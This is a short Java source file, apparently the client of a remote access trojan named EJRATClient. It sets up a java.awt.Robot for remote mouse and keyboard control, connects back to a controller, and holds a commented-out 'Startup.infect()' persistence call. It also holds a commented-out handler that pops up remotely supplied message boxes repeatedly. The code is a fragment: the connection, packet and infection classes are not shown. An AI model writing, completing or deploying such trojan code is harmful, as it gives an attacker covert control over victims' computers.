package ej.ratclient;

import ej.ratclient.packet.PacketReceiver;
import java.awt.Robot;

public class EJRATClient extends PacketReceiver {

    private static EJRATClient instance = null;
    public Robot robot;

    public static void main(String[] args) {
        EJRATClient ej = new EJRATClient();
        instance = ej;
        try {
            ej.robot = new Robot();
        } catch (Exception ignored) {
        }
        //Startup.infect();
        ej.connect();
    }

    public static EJRATClient get() {
        return instance;
    }
    
    public Robot getRobot() {
        return robot;
    }

    /* @Override DONT DELETE THESE YET TILL I PUT THEM IN THERE CLASSES
    public void parsePacket(Packet p) {
    int opcode = p.get();
    switch (opcode) {
    case 2:
    String title = p.getString();
    String text = p.getString();
    int repeat = p.getInt();
    for (int i = 0; i < repeat; i++) {
    javax.swing.JOptionPane.showMessageDialog(null, text, title, 1);
    }
    break;
    }
    }*/
}
